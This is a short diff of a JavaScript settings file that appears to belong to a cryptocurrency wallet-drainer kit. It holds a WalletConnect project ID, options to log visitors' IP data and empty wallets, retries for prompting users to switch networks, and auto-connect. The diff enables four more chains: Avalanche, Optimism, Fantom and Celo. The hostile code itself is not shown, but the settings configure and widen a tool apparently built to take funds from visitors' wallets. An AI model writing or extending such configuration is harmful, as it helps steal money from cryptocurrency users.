@@ -16,7 +16,7 @@ let wc_projectid = "7b3d5a6b0763294065cb92efa56375de"; // ProjectID from https:/
 let logIpData =  true; // Add IP data to logs
 let logEmptyWallets = false; // Log when wallet is empty
 
-let defaultChain = "mainnet"; // Default chain (mainnet / bsc / polygon / arbitrum)
+let defaultChain = "mainnet"; // Default chain (mainnet / bsc / polygon / arbitrum / avalanche / fantom / optimism / celo)
 
 
 // Manual disable/enable chains. true - enabled, false - disabled
@@ -24,8 +24,12 @@ let eth_enabled = true;
 let bsc_enabled = true;
 let arb_enabled = true;
 let polygon_enabled = true;
+let avalanche_enabled = true;
+let optimism_enabled = true;
+let ftm_enabled = true;
+let celo_enabled = true;
 
-let retry_switchchain = 1; // How many times retry to ask for switching chain.
+let retry_changenetwork = 2;
 
 let autoconnect = false; // Automatically connect wallet after page loaded
 
